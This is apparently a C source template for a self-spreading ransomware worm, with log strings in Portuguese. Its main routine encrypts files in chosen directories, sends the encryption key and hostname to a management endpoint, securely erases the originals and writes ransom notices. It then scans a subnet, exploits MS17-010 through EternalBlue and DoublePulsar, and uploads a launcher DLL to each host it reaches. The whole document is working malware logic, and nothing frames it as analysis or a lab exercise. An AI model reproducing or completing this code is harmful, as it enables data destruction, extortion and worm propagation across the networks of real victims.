// templates/worm/main.c.tpl
// Gerado automaticamente. Nao edite manualmente.

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#include "config.h"

int self_path(char *buf, size_t buf_len);
size_t scan_targets(const char *subnet, int port, char targets[][16], size_t max_hosts);
int mark_infected(const char *ip);
int random_bytes(unsigned char *out, size_t len);
int base64_encode_string(const unsigned char *data, size_t data_len, char *out, size_t out_size);
size_t list_target_files(const char *const *dirs, size_t dir_count,
                         const char *const *exts, size_t ext_count, char ***out_paths);
int write_encrypted_sibling(const char *path, const unsigned char *key, size_t key_len);
int secure_erase(const char *path);
int write_notice(const char *directory);
int transmit_token(const char *endpoint, const char *token_json);
int ms17_vuln_status(const char *ip, int port);
int EternalBlue(const char *ip, int port);
int doublepulsar_check(const char *ip, int port);
int build_launcher_dll(const char *binary_path, const char *dll_out_path);
int upload_payload(const char *ip, int port, const char *payload_path, int payload_type);

static int ransom_local(void)
{
    unsigned char key[SESSION_KEY_LEN];
    char token_b64[256];
    char json[1024];
    char hostname[256];
    DWORD hostname_len = sizeof(hostname);
    char **paths = NULL;
    unsigned char *done = NULL;
    char *affected[256];
    size_t affected_count = 0;
    size_t encrypted_count = 0;
    size_t count;
    size_t i;
    const char *run_id;
    const char *key_id;

    if (random_bytes(key, sizeof key) != 0)
        return -1;
    if (base64_encode_string(key, sizeof key, token_b64, sizeof token_b64) != 0)
        return -1;
    if (!GetComputerNameA(hostname, &hostname_len))
        snprintf(hostname, sizeof hostname, "unknown");
    hostname[sizeof hostname - 1] = '\0';
    run_id = getenv("RUN_ID") ? getenv("RUN_ID") : "run-unknown";
    key_id = getenv("KEY_ID") ? getenv("KEY_ID") : "key-1";

    count = list_target_files(TARGET_DIRS, TARGET_DIR_COUNT,
                              TARGET_EXTS, TARGET_EXT_COUNT, &paths);
    if (count > 0) {
        done = calloc(count, sizeof *done);
        if (done == NULL) {
            for (i = 0; i < count; i++) free(paths[i]);
            free(paths);
            return -1;
        }
    }
    for (i = 0; i < count; i++) {
        char dirbuf[4096];
        char *slash;

        if (write_encrypted_sibling(paths[i], key, sizeof key) != 0)
            continue;
        done[i] = 1;
        encrypted_count++;
        if (snprintf(dirbuf, sizeof dirbuf, "%s", paths[i]) < 0)
            continue;
        slash = strrchr(dirbuf, '\\');
        if (slash == NULL)
            slash = strrchr(dirbuf, '/');
        if (slash != NULL) {
            *slash = '\0';
            if (affected_count < 256) {
                affected[affected_count] = _strdup(dirbuf);
                if (affected[affected_count] != NULL)
                    affected_count++;
            }
        }
    }
    snprintf(json, sizeof json,
             "{\"run_id\":\"%s\",\"key_id\":\"%s\","
             "\"aes_key\":\"%s\",\"hostname\":\"%s\",\"file_count\":%lu}",
             run_id, key_id, token_b64, hostname,
             (unsigned long)encrypted_count);
    transmit_token(MANAGEMENT_ENDPOINT, json);

    for (i = 0; i < count; i++) {
        if (done[i] != 0)
            secure_erase(paths[i]);
        free(paths[i]);
    }
    free(paths);
    free(done);

    for (i = 0; i < affected_count; i++) {
        write_notice(affected[i]);
        free(affected[i]);
    }
    return 0;
}

static void infect_host(const char *ip, const char *self)
{
    int attempt;

    if (mark_infected(ip))
        return;
    if (ms17_vuln_status(ip, TARGET_PORT) <= 0)
        return;
    for (attempt = 0; attempt < MAX_RETRIES; attempt++) {
        if (EternalBlue(ip, TARGET_PORT) == 0)
            break;
    }
    if (attempt == MAX_RETRIES)
        return;
    if (doublepulsar_check(ip, TARGET_PORT) <= 0)
        return;
    if (build_launcher_dll(self, LAUNCHER_DLL_PATH) != 0)
        return;
    upload_payload(ip, TARGET_PORT, LAUNCHER_DLL_PATH, 1);
}

int main(void)
{
    WSADATA wsa;
    char self[MAX_PATH];
    char targets[MAX_SCAN_HOSTS][16];
    size_t target_count = 0;
    size_t i;

#ifdef SIGPIPE
    signal(SIGPIPE, SIG_IGN);
#endif

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        return 1;

    if (self_path(self, sizeof self) != 0)
        return 1;

    printf("[worm] self: %s\n", self);
    printf("[worm] ransom local...\n");
    ransom_local();

    printf("[worm] scanning %s:%d...\n", TARGET_SUBNET, TARGET_PORT);
    target_count = scan_targets(TARGET_SUBNET, TARGET_PORT, targets, MAX_SCAN_HOSTS);
    printf("[worm] %lu alvo(s)\n", (unsigned long)target_count);

    for (i = 0; i < target_count; i++) {
        printf("[worm] infectando %s\n", targets[i]);
        infect_host(targets[i], self);
    }

    WSACleanup();
    return 0;
}
